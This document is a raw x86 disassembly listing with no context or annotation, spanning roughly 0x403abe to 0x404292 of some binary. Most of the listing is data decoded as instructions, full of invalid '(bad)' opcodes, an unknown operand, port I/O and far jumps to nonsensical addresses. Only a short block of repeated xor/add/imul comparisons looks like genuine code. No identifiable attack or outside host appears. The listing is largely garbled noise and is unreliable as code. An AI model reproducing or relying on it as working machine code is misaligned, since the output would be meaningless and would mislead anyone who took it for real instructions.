  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403ab0
  403acb:	sbb    eax,0x10203050
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403aca
  403ad7:	pop    edx
  403ad8:	and    ah,BYTE PTR [ebx+0x4d124778]
  403ade:	pop    ebp
  403adf:	idiv   BYTE PTR [ebp-0x2d5e69bb]
  403ae5:	sub    BYTE PTR ds:0x741146bc,dh
  403aeb:	int    0x57
  403aed:	mov    dh,0xc5
  403aef:	mov    ebp,0x646d586a
  403af4:	sub    al,0x5e
  403af6:	xor    al,0x7e
  403af8:	xchg   ebx,eax
  403af9:	push   esi
  403afa:	test   ch,ah
  403afc:	in     al,dx
  403afd:	out    dx,eax
  403afe:	sub    BYTE PTR [esi],al
  403b00:	mov    eax,0x6fd0a17c
  403b05:	xor    al,0xf8
  403b07:	popa   
  403b08:	out    dx,al
  403b09:	pop    ebx
  403b0a:	push   ecx
  403b0b:	cmc    
  403b0c:	inc    ecx
  403b0d:	(bad)  {k3}
  403b12:	lahf   
  403b13:	shl    edi,0x19
  403b16:	inc    BYTE PTR [edi-0x75]
  403b19:	push   edx
  403b1a:	das    
  403b1b:	fs mov ecx,0xeac7968f
  403b21:	jmp    0x403b27
  403b23:	cmp    eax,0xd0114394
  403b28:	add    DWORD PTR [esi+0x4b599d15],ebp
  403b2e:	rol    BYTE PTR [ebx+0x3f],0x20
  403b32:	enter  0xa07c,0x61
  403b36:	(bad)  
  403b37:	clc    
  403b38:	sets   BYTE PTR fs:[esi]
  403b3c:	cmp    ebp,DWORD PTR ds:0x825e11f0
  403b42:	pop    edx
  403b43:	xor    bh,BYTE PTR [edi+0x51ad831d]
  403b49:	xchg   ebx,eax
  403b4a:	mov    eax,ds:0xc7c3ea6d
  403b4f:	fwait
  403b50:	xor    edi,DWORD PTR [edx+0x7c]
  403b53:	xchg   esi,eax
  403b54:	pop    es
  403b55:	data16 sbb BYTE PTR [ebx+0x5f],bl
  403b59:	sti    
  403b5a:	sbb    al,0xbc
  403b5c:	cs jae 0x403b25
  403b5f:	dec    esi
  403b60:	in     al,0xdf
  403b62:	popf   
  403b63:	mov    al,0x5b
  403b65:	jne    0x403b98
  403b67:	adc    BYTE PTR [ebx+edi*1],bl
  403b6a:	ins    BYTE PTR es:[edi],dx
  403b6b:	rcr    ecx,0x7b
  403b6e:	adc    eax,0xe763d041
  403b73:	or     ch,dh
  403b75:	inc    edx
  403b76:	out    0xa0,eax
  403b78:	dec    ebx
  403b79:	daa    
  403b7a:	cmp    eax,0xbc891121
  403b7f:	jmp    FWORD PTR [ebx]
  403b81:	outs   dx,BYTE PTR ds:[esi]
  403b82:	mov    edx,0xa1dbc146
  403b87:	js     0x403b2f
  403b89:	fistp  WORD PTR ds:0x4a845c8e
  403b8f:	hlt    
  403b90:	push   cs
  403b91:	cs shl bl,0x9b
  403b95:	enter  0xc088,0xa3
  403b99:	mov    eax,0x88d885e8
  403b9e:	jg     0x403be6
  403ba0:	or     eax,0xf729a7aa
  403ba5:	pop    eax
  403ba6:	sub    BYTE PTR [eax-0x442a8f66],0xce
  403bad:	jle    0x403c2c
  403baf:	jmp    0xc465:0x36a21dd4
  403bb6:	out    0x77,al
  403bb8:	jp     0x403b8b
  403bba:	lods   eax,DWORD PTR ds:[esi]
  403bbb:	or     BYTE PTR [edx+0x180618d0],ch
  403bc1:	mov    al,0xbc
  403bc3:	add    DWORD PTR [eax],0xc389dcad
  403bc9:	push   0xffffffbc
  403bcb:	lock inc esp
  403bcd:	push   edi
  403bce:	push   ecx
  403bcf:	add    BYTE PTR [ebp-0x9],dl
  403bd2:	and    esi,DWORD PTR [esi]
  403bd4:	jno    0x403ba2
  403bd6:	cli    
  403bd7:	push   ss
  403bd8:	rcr    BYTE PTR [eax+edx*8],cl
  403bdb:	cmp    al,0x43
  403bdd:	or     ecx,DWORD PTR [esi]
  403bdf:	mov    eax,0x57646b66
  403be4:	ret    0xb9db
  403be7:	dec    ecx
  403be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403be9:	mov    cl,0x66
  403beb:	adc    esp,DWORD PTR [ecx+0xa]
  403bee:	fiadd  WORD PTR [ecx+0x395aabcf]
  403bf4:	call   0xf07a:0xf60bece3
  403bfb:	gs and dl,cl
  403bfe:	ss adc al,0x78
  403c01:	or     BYTE PTR cs:[esi],0x38
  403c05:	aam    0x92
  403c07:	push   esp
  403c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c09:	adc    eax,0x727a1d44
  403c0e:	or     eax,0x7b25fa3f
  403c13:	jl     0x403c17
  403c15:	test   BYTE PTR [esi+0x4a87413e],dh
  403c1b:	xchg   ecx,eax
  403c1c:	(bad)  
  403c1e:	cmp    ch,BYTE PTR [ebx]
  403c20:	dec    ebp
  403c21:	stos   BYTE PTR es:[edi],al
  403c22:	mov    dl,0xb1
  403c24:	cmp    eax,0x10732bdc
  403c29:	sub    eax,DWORD PTR [edx]
  403c2b:	jecxz  0x403c44
  403c2d:	cs mov bh,0xa9
  403c30:	adc    ebp,DWORD PTR [edi+0x2b91bed4]
  403c36:	fnsave [ebx+0x6f]
  403c39:	adc    DWORD PTR [esi+0x584ac654],ebx
  403c3f:	mov    dh,0xf6
  403c41:	sbb    DWORD PTR [ebp+0x76],esi
  403c44:	add    edi,ecx
  403c46:	imul   ebx,ebp,0x0
  403c49:	shl    BYTE PTR [esi-0x1aa1e563],1
  403c4f:	shl    BYTE PTR [ebx],1
  403c51:	shl    BYTE PTR [eax-0xf],0x2e
  403c55:	aaa    
  403c56:	imul   esi,ebx,0xe
  403c59:	adc    bh,bh
  403c5b:	push   ebx
  403c5c:	retf   
  403c5d:	jns    0x403cb8
  403c5f:	pop    eax
  403c60:	xor    DWORD PTR [edx+0xb8c49fa],ebx
  403c66:	imul   ecx,DWORD PTR [edx+0x4f],0xab22bb08
  403c6d:	in     al,dx
  403c6e:	sbb    esp,DWORD PTR [eax]
  403c70:	and    eax,0xb4b9bb19
  403c75:	xor    cl,ah
  403c77:	les    edi,FWORD PTR [ecx+0x87865d8]
  403c7d:	pop    ds
  403c7e:	test   al,0x75
  403c80:	fist   DWORD PTR [eax-0x6eac7795]
  403c86:	pop    esp
  403c87:	mov    ch,0x4b
  403c89:	mov    es,WORD PTR [eax-0x13]
  403c8c:	cmp    BYTE PTR [ebp+0x129f25ec],bl
  403c92:	jns    0x403cfc
  403c94:	addr16 das 
  403c96:	sbb    DWORD PTR [edx-0xc587b05],edx
  403c9c:	push   ebp
  403c9d:	sub    BYTE PTR [ecx+0x4c],bh
  403ca0:	push   ebx
  403ca1:	mov    cl,0x8e
  403ca3:	stos   BYTE PTR es:[edi],al
  403ca4:	cmp    al,0x74
  403ca6:	add    eax,0xb26a7e01
  403cab:	push   eax
  403cac:	jle    0x403c99
  403cae:	mov    ds:0x217fff58,eax
  403cb3:	or     al,0x2f
  403cb5:	repz or BYTE PTR [ebx+0x60c4a097],0xbc
  403cbd:	lock aad 0x86
  403cc0:	jmp    0xfec3:0x101c3e8d
  403cc7:	sub    DWORD PTR [edx+eiz*2],ecx
  403cca:	jg     0x403cc6
  403ccc:	(bad)  
  403ccd:	mov    bh,BYTE PTR [edx]
  403ccf:	inc    edx
  403cd0:	jle    0x403d4f
  403cd2:	bound  edx,QWORD PTR [ebx]
  403cd4:	in     eax,dx
  403cd5:	(bad)  [ebp+0x1a]
  403cd8:	pop    ds
  403cd9:	pop    edi
  403cda:	push   edi
  403cdb:	in     al,0x7e
  403cdd:	add    DWORD PTR [edi+0x2e],ecx
  403ce0:	or     dl,al
  403ce2:	loopne 0x403ca4
  403ce4:	dec    esi
  403ce5:	std    
  403ce6:	and    al,0x7
  403ce8:	xor    eax,0x9824aae1
  403ced:	xor    al,0x5a
  403cef:	data16 div BYTE PTR [ebx+0x222488]
  403cf6:	push   ebp
  403cf7:	mov    ecx,0xd856a5ab
  403cfc:	and    dh,dh
  403cfe:	and    DWORD PTR [edx+0x7d40425c],esi
  403d04:	xchg   ebp,eax
  403d05:	cld    
  403d06:	loop   0x403d87
  403d08:	jmp    DWORD PTR [ecx+0x70]
  403d0b:	sbb    al,0x90
  403d0d:	jbe    0x403d01
  403d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d10:	jecxz  0x403ca9
  403d12:	push   0xfa6b7576
  403d17:	add    BYTE PTR [esi-0x62],bl
  403d1a:	mov    bl,0xa2
  403d1c:	call   0x846b:0x2cff0579
  403d23:	aad    0xc6
  403d25:	mov    al,ds:0xe15abfb6
  403d2a:	pusha  
  403d2b:	xchg   edi,eax
  403d2c:	push   cs
  403d2d:	mov    edx,DWORD PTR [ebx]
  403d2f:	sbb    cl,BYTE PTR [esp+ebp*2-0x5b3ee276]
  403d36:	cmp    eax,0xe1c0ce1
  403d3b:	jne    0x403d62
  403d3d:	inc    eax
  403d3e:	loopne 0x403d9c
  403d40:	aam    0xce
  403d42:	repz and cl,ch
  403d45:	sbb    DWORD PTR [ebx],ebx
  403d47:	add    bh,BYTE PTR [ebp+ebx*2+0x8]
  403d4b:	dec    edi
  403d4c:	rol    BYTE PTR [eax-0x1de2a43b],cl
  403d52:	popf   
  403d53:	add    DWORD PTR [ecx],edx
  403d55:	aaa    
  403d56:	mov    cl,ah
  403d58:	test   eax,0x74d6ce48
  403d5d:	mov    ch,0x31
  403d5f:	jbe    0x403da1
  403d61:	cmp    eax,0xf9bf9c6b
  403d66:	mov    ch,BYTE PTR [edi+0x25]
  403d69:	and    BYTE PTR [eax+edx*8+0x74b09313],0x40
  403d71:	cmc    
  403d72:	aad    0xac
  403d74:	scas   eax,DWORD PTR es:[edi]
  403d75:	add    ah,BYTE PTR [di+0x6677]
  403d7a:	pop    ss
  403d7b:	cmp    DWORD PTR [ebp+0x2103bc03],ebp
  403d81:	mov    eax,ds:0xcaed143e
  403d86:	fs push 0xffffffe8
  403d89:	xor    ebx,DWORD PTR [edx-0x5433129b]
  403d8f:	sub    eax,0x90223bd4
  403d94:	jmp    0xd5e2686c
  403d99:	cmp    DWORD PTR [edi],eax
  403d9b:	dec    eax
  403d9c:	arpl   WORD PTR [ecx],sp
  403d9e:	fbld   TBYTE PTR [ecx-0x24]
  403da1:	out    dx,eax
  403da2:	and    bl,BYTE PTR [ecx+0x73ef92cd]
  403da8:	mov    esi,0x25ec4bd7
  403dad:	xor    eax,0xed6e2c19
  403db2:	enter  0x4980,0x2e
  403db6:	xchg   DWORD PTR [esp+esi*2-0x74edcd16],edx
  403dbd:	pop    ebp
  403dbe:	lock sub ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x2e
  403e75:	fsubr  QWORD PTR ds:0x7e1f0a6c
  403e7b:	jle    0x403ed5
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403ef6
  403e81:	dec    edi
  403e82:	aam    0xeb
  403e84:	mov    edi,0xe180c00e
  403e89:	or     esp,esp
  403e8b:	or     DWORD PTR [esi],ecx
  403e8d:	popf   
  403e8e:	leave  
  403e8f:	or     al,bh
  403e91:	jmp    0xbc3f4161
  403e96:	xor    eax,0x1ae1cff9
  403e9b:	es aaa 
  403e9d:	cs adc ah,ah
  403ea0:	dec    edi
  403ea1:	cli    
  403ea2:	sub    al,0x37
  403ea4:	or     BYTE PTR [esi+0x7223c25a],dh
  403eaa:	icebp  
  403eab:	push   cs
  403eac:	jmp    0x8a83:0xd444d7b3
  403eb3:	inc    edx
  403eb4:	xchg   esp,eax
  403eb5:	jl     0x403e42
  403eb7:	test   eax,0x79c5428e
  403ebc:	lods   al,BYTE PTR ds:[esi]
  403ebd:	jo     0x403f1d
  403ebf:	out    dx,al
  403ec0:	dec    ebp
  403ec1:	add    BYTE PTR [ebx],ah
  403ec3:	dec    eax
  403ec4:	xor    DWORD PTR [ecx-0x541bd830],edx
  403eca:	jge    0x403f22
  403ecc:	jmp    0x315ec038
  403ed1:	bound  ebp,QWORD PTR [ebx+ebx*4]
  403ed4:	std    
  403ed5:	mov    ebx,0x8f83a609
  403eda:	jp     0x403efc
  403edc:	int3   
  403edd:	push   ebx
  403ede:	stc    
  403edf:	ins    DWORD PTR es:[edi],dx
  403ee0:	mov    ds:0x8df23cd0,eax
  403ee5:	jmp    0x403f0f
  403ee7:	adc    bh,BYTE PTR [edx+0x11]
  403eea:	xor    esp,esp
  403eec:	mov    eax,0x6ee0910b
  403ef1:	jp     0x403ed5
  403ef3:	jl     0x403f4d
  403ef5:	push   edx
  403ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ef7:	shr    BYTE PTR [edx-0xf0485ce],0x63
  403efe:	add    esp,DWORD PTR [ecx+0x63f3eb31]
  403f04:	add    BYTE PTR ds:0x43f51732,0xb6
  403f0b:	nop
  403f0c:	pop    ecx
  403f0d:	xchg   esp,eax
  403f0e:	xchg   ecx,eax
  403f0f:	in     al,dx
  403f10:	pop    edx
  403f11:	scas   al,BYTE PTR es:[edi]
  403f12:	inc    ebp
  403f13:	ret    
  403f14:	fistp  WORD PTR [eax]
  403f16:	ror    DWORD PTR [ebx],1
  403f18:	sub    eax,0xd575f2f
  403f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f1e:	push   es
  403f1f:	fnstcw WORD PTR [eax]
  403f21:	mov    ch,0x20
  403f23:	xchg   edi,eax
  403f24:	popa   
  403f25:	or     esi,DWORD PTR [eax+0x60]
  403f28:	and    DWORD PTR [ebp+0x1f],edi
  403f2b:	fstp   st(3)
  403f2d:	xor    dl,dl
  403f2f:	aaa    
  403f30:	pop    ebx
  403f31:	iret   
  403f32:	outs   dx,BYTE PTR ds:[esi]
  403f33:	jae    0x403ee2
  403f35:	xchg   ecx,eax
  403f36:	in     eax,dx
  403f37:	sar    ebp,0x1f
  403f3a:	mov    ?,WORD PTR [edi]
  403f3c:	xchg   edx,eax
  403f3d:	dec    eax
  403f3e:	iret   
  403f3f:	jl     0x403f70
  403f41:	mov    eax,0xb85759e0
  403f46:	retf   0x9d90
  403f49:	pop    esi
  403f4a:	inc    eax
  403f4b:	dec    ebx
  403f4c:	xchg   DWORD PTR [ebx+edi*4],ebp
  403f4f:	cmp    al,dh
  403f51:	jno    0x403f0d
  403f53:	pusha  
  403f54:	or     al,0xeb
  403f56:	leave  
  403f57:	push   ebx
  403f58:	test   BYTE PTR [esi-0x6e2b2bd9],ah
  403f5e:	stos   DWORD PTR es:[edi],eax
  403f5f:	push   ds
  403f60:	js     0x403eea
  403f62:	jl     0x403f36
  403f64:	inc    esi
  403f65:	dec    ebx
  403f66:	xchg   eax,esp
  403f68:	arpl   WORD PTR [ebx+eiz*8],sp
  403f6b:	stos   BYTE PTR es:[edi],al
  403f6c:	ffreep st(3)
  403f6e:	in     eax,0x55
  403f70:	mov    esp,0x58e84f46
  403f75:	or     eax,ecx
  403f77:	cmp    DWORD PTR [edx],edi
  403f79:	sub    eax,0x24bf2948
  403f7e:	cld    
  403f7f:	jl     0x403fbf
  403f81:	inc    esi
  403f82:	or     DWORD PTR [ecx],eax
  403f84:	out    dx,eax
  403f85:	pop    es
  403f86:	ss push eax
  403f88:	xor    esi,0x34
  403f8b:	(bad)  
  403f8c:	jle    0x403f1a
  403f8e:	jo     0x403f27
  403f90:	aas    
  403f91:	dec    esi
  403f92:	mov    bh,0xeb
  403f94:	aas    
  403f95:	push   ds
  403f96:	inc    edi
  403f97:	push   eax
  403f98:	outs   dx,BYTE PTR ds:[esi]
  403f99:	pop    es
  403f9a:	xchg   edx,eax
  403f9b:	add    eax,DWORD PTR [ecx+0x76e5aaef]
  403fa1:	es jns 0x403fba
  403fa4:	fdiv   DWORD PTR [edx]
  403fa6:	jno    0x403f4d
  403fa8:	sub    al,0x50
  403faa:	mov    ch,0x61
  403fad:	lds    edi,FWORD PTR [ecx+0x7acf0090]
  403fb3:	pop    eax
  403fb4:	std    
  403fb5:	sub    bl,ch
  403fb7:	inc    eax
  403fb8:	imul   ebp,DWORD PTR [edi-0x75051f2],0x69
  403fbf:	pop    esi
  403fc0:	sub    ecx,DWORD PTR [ebx-0x1d59c83]
  403fc6:	outs   dx,DWORD PTR ds:[esi]
  403fc7:	aam    0xbd
  403fc9:	fcomp  st(6)
  403fcb:	jae    0x404024
  403fcd:	push   eax
  403fce:	cmp    esi,DWORD PTR [edx]
  403fd0:	sahf   
  403fd1:	cmp    dl,BYTE PTR [ebp-0x73bde6a7]
  403fd7:	inc    eax
  403fd8:	sar    DWORD PTR [ebp-0x44],cl
  403fdb:	scas   al,BYTE PTR es:[edi]
  403fdc:	add    cl,bl
  403fde:	rcr    BYTE PTR [edi-0x69],1
  403fe1:	inc    edi
  403fe2:	adc    ecx,esi
  403fe4:	xor    esi,DWORD PTR [ecx]
  403fe6:	inc    esi
  403fe7:	push   edi
  403fe8:	rol    DWORD PTR [ebx],0x33
  403feb:	mov    dh,0xfe
  403fed:	aaa    
  403fee:	jg     0x403fcf
  403ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff1:	cli    
  403ff2:	jno    0x403f9b
  403ff4:	mov    bh,0xf4
  403ff6:	jge    0x40404f
  403ff8:	and    al,0x72
  403ffa:	add    edx,DWORD PTR [ecx-0x244c00cb]
  404000:	sbb    DWORD PTR [ecx-0x37cb94c0],0xdfb2d5e6
  40400a:	scas   eax,DWORD PTR es:[edi]
  40400b:	jg     0x404066
  40400d:	cmp    DWORD PTR ds:0x968967ec,ecx
  404013:	into   
  404014:	push   cs
  404015:	fist   DWORD PTR [ebp+0x3a53311c]
  40401b:	sub    ecx,edx
  40401d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40401e:	xor    al,bl
  404020:	out    dx,eax
  404021:	ret    0x7e88
  404024:	loopne 0x403fd9
  404026:	ret    0x84bc
  404029:	call   FWORD PTR [ebx]
  40402b:	mov    eax,ds:0x4284b7b2
  404030:	daa    
  404031:	or     esi,ebx
  404033:	xor    DWORD PTR [ebx],esi
  404035:	mov    ebp,0x2643df13
  40403a:	mov    edx,0x823684e2
  40403f:	add    eax,0x45e69009
  404044:	nop
  404045:	lahf   
  404046:	mov    cl,0xd1
  404048:	pop    ebx
  404049:	sub    bl,dl
  40404b:	push   esp
  40404c:	stos   BYTE PTR es:[edi],al
  40404d:	push   eax
  40404e:	dec    ebp
  40404f:	in     eax,dx
  404050:	jle    0x403ff7
  404052:	mov    cl,0x37
  404054:	push   es
  404055:	js     0x403fe2
  404057:	leave  
  404058:	pop    es
  404059:	out    dx,al
  40405a:	int    0x13
  40405c:	div    DWORD PTR [esi]
  40405e:	mov    ss,edi
  404060:	aad    0xf8
  404062:	jmp    0x9d764e07
  404067:	not    BYTE PTR [ecx]
  404069:	push   esp
  40406a:	cwde   
  40406b:	aas    
  40406c:	pop    ebx
  40406d:	cwde   
  40406e:	jle    0x404027
  404070:	sbb    al,0xff
  404072:	inc    esp
  404073:	call   0x1a234c41
  404078:	sub    eax,0x80902840
  40407d:	and    al,0xbb
  40407f:	jmp    0x404001
  404081:	mov    esi,0xa9006587
  404086:	push   ds
  404087:	ds int 0x47
  40408a:	adc    ebp,DWORD PTR [si-0x5c]
  40408e:	sbb    BYTE PTR [esp+ecx*2+0x28],0x3d
  404093:	jmp    0xc906:0x82030a43
  40409a:	push   0x2d8c4c5b
  40409f:	repnz inc ebx
  4040a1:	loopne 0x4040a4
  4040a3:	adc    DWORD PTR [eax+0x6b0d3f35],ebp
  4040a9:	clc    
  4040aa:	dec    ecx
  4040ab:	mov    cl,0x15
  4040ad:	daa    
  4040ae:	fstp   TBYTE PTR [eax+0x1d]
  4040b1:	xchg   ebx,eax
  4040b2:	or     eax,0xaed1b61f
  4040b7:	or     eax,DWORD PTR [eax+0x142f9c6]
  4040bd:	hlt    
  4040be:	outs   dx,BYTE PTR ds:[esi]
  4040bf:	scas   eax,DWORD PTR es:[edi]
  4040c0:	cmp    eax,0x9bf2b0c8
  4040c5:	sbb    bh,BYTE PTR ds:0xcbe1769d
  4040cb:	test   al,0x3a
  4040cd:	sub    BYTE PTR [edi],ch
  4040cf:	sbb    dl,BYTE PTR [ebx+ebx*1-0x80]
  4040d3:	adc    al,0xb7
  4040d5:	aad    0x39
  4040d7:	jg     0x4040b1
  4040d9:	push   edi
  4040da:	mov    ah,0x34
  4040dc:	cs cli 
  4040de:	sbb    al,0xf0
  4040e0:	pop    ecx
  4040e1:	lock daa 
  4040e3:	aad    0x60
  4040e5:	inc    edi
  4040e6:	inc    esp
  4040e7:	nop
  4040e8:	sub    dl,BYTE PTR [eax+0x58]
  4040eb:	pop    ebx
  4040ec:	pop    esp
  4040ed:	ds out 0xd1,eax
  4040f0:	or     al,0x47
  4040f2:	and    al,0x1d
  4040f4:	cmp    DWORD PTR [edx+ecx*2],edx
  4040f7:	add    DWORD PTR [edx-0x71],edi
  4040fa:	out    dx,eax
  4040fb:	jnp    0x40407d
  4040fd:	xchg   esp,eax
  4040fe:	mov    cs,WORD PTR [ebp-0x1d30b846]
  404104:	sub    eax,0x738a0e9
  404109:	out    dx,al
  40410a:	pop    ebp
  40410b:	fistp  DWORD PTR [ebx]
  40410d:	and    al,0x3f
  40410f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404110:	jbe    0x404165
  404112:	push   esi
  404113:	jne    0x404189
  404115:	loop   0x404176
  404117:	sahf   
  404118:	xchg   ecx,ebp
  40411a:	inc    eax
  40411b:	pop    ecx
  40411c:	cmc    
  40411d:	or     eax,edx
  40411f:	in     al,dx
  404120:	scas   eax,DWORD PTR es:[edi]
  404121:	mov    edi,eax
  404123:	inc    esi
  404124:	sub    eax,0x1a10311
  404129:	inc    ecx
  40412a:	loope  0x404195
  40412c:	xchg   ebp,eax
  40412d:	xor    al,bh
  40412f:	lock ret 0xdbad
  404133:	mov    cl,0xd9
  404135:	sbb    al,0x91
  404137:	adc    cl,BYTE PTR [edi+0x366affc5]
  40413d:	push   0x1e9d1740
  404142:	inc    esp
  404143:	mov    ds:0x865d7f05,eax
  404148:	retf   
  404149:	dec    esp
  40414b:	pop    es
  40414c:	adc    BYTE PTR [eax-0x38],al
  40414f:	or     eax,0x57491d
  404154:	inc    esp
  404155:	es jbe 0x4041c5
  404158:	jne    0x404147
  40415a:	dec    edx
  40415b:	xchg   edi,eax
  40415c:	push   esp
  40415d:	rol    BYTE PTR [edi],1
  40415f:	xchg   esi,eax
  404160:	pushf  
  404161:	dec    edi
  404162:	dec    edi
  404163:	daa    
  404164:	pushf  
  404165:	enter  0xdf2b,0x3b
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [esp+ebx*8+0x52],dh
  40418d:	and    DWORD PTR [ebp+ebx*1+0x7e],esi
  404191:	jle    0x4041eb
  404193:	jl     0x404213
  404195:	jle    0x40419d
  404197:	mov    eax,0xb2355061
  40419c:	xchg   esp,eax
  40419d:	jo     0x4041a6
  40419f:	and    al,0x42
  4041a1:	ins    BYTE PTR es:[edi],dx
  4041a2:	in     al,dx
  4041a3:	int    0x4e
  4041a5:	dec    ebp
  4041a6:	cmp    ch,cl
  4041a8:	js     0x404150
  4041aa:	push   ebp
  4041ab:	ins    BYTE PTR es:[edi],dx
  4041ac:	or     esi,DWORD PTR [ebx+0x42d5dc33]
  4041b2:	stos   BYTE PTR es:[edi],al
  4041b3:	cld    
  4041b4:	mov    al,ds:0x195e3514
  4041b9:	lahf   
  4041ba:	shr    cl,1
  4041bc:	test   edx,esp
  4041be:	mov    dl,0xac
  4041c0:	scas   eax,DWORD PTR es:[edi]
  4041c1:	sbb    ebp,DWORD PTR [eax+0x78318d2c]
  4041c7:	adc    DWORD PTR [eax-0x7dd0e589],esi
  4041cd:	pop    esp
  4041ce:	imul   edi,DWORD PTR [esi+0x469dcbfe],0x46874c6
  4041d8:	fisub  DWORD PTR [ecx+ecx*1+0xc9e7bc6]
  4041df:	pop    eax
  4041e0:	xchg   bl,bl
  4041e2:	js     0x4041e6
  4041e4:	jno    0x4041be
  4041e6:	xchg   esi,eax
  4041e7:	pop    esi
  4041e8:	pop    ds
  4041e9:	cmc    
  4041ea:	mov    esp,0xa38b126c
  4041ef:	mov    al,0xe6
  4041f1:	fsub   st,st(6)
  4041f3:	test   eax,0x9d6cf0d7
  4041f8:	cld    
  4041f9:	xchg   ebx,eax
  4041fa:	out    0xe1,eax
  4041fc:	jb     0x4041b0
  4041fe:	mov    ebp,0x87a92068
  404203:	gs lock cli 
  404206:	pop    ss
  404207:	sahf   
  404208:	data16 (bad) 
  40420a:	loop   0x404263
  40420c:	ins    BYTE PTR es:[edi],dx
  40420d:	sub    al,0x54
  40420f:	inc    ecx
  404210:	repnz mov ds:0x5c0d3d04,al
  404216:	jns    0x404237
  404218:	dec    esi
  404219:	adc    al,0x34
  40421b:	ss stos BYTE PTR es:[edi],al
  40421d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421e:	cmp    DWORD PTR [edi],esi
  404220:	xchg   ebp,eax
  404221:	addr16 enter 0x60c7,0xcd
  404226:	cld    
  404227:	je     0x4041e6
  404229:	lea    ecx,[edx+0x2e]
  40422c:	imul   ebp,DWORD PTR [eax-0x45a1451f],0xffffff9b
  404233:	mov    esi,0x2e93d94b
  404238:	pushf  
  404239:	mov    edx,0x5361ab46
  40423e:	mov    eax,0x457dc73b
  404243:	stos   BYTE PTR es:[edi],al
  404244:	imul   BYTE PTR [ebx]
  404246:	out    dx,eax
  404247:	xor    edi,DWORD PTR [esi]
  404249:	dec    edx
  40424a:	aad    0x63
  40424c:	jns    0x404271
  40424e:	mov    cl,al
  404250:	pop    ebp
  404251:	shl    DWORD PTR [esi],1
  404253:	pop    eax
  404254:	dec    edi
  404255:	test   DWORD PTR [esi+0x61],ebp
  404258:	jns    0x4041e4
  40425a:	jae    0x4041e9
  40425c:	mov    ds:0x899fa64a,eax
  404261:	mov    edx,0x277865e2
  404266:	aaa    
  404267:	int3   
  404268:	push   edx
  404269:	(bad)  
  40426a:	adc    bh,cl
  40426c:	iret   
  40426d:	(bad)  
  40426f:	xor    DWORD PTR [edi],edx
  404271:	jns    0x40427e
  404273:	ret    
  404274:	mov    dl,0xff
  404276:	mov    gs,WORD PTR [esi]
  404278:	out    dx,al
  404279:	dec    edx
  40427a:	stos   BYTE PTR es:[edi],al
  40427b:	sub    esp,DWORD PTR [ebx+0x5fa17861]
  404281:	mov    cl,0xea
  404283:	xor    eax,0x98683225
  404288:	out    dx,eax
  404289:	inc    edi
  40428a:	mul    DWORD PTR ds:0x759edf05
  404290:	fisub  DWORD PTR [edx]
  404292:	clc    
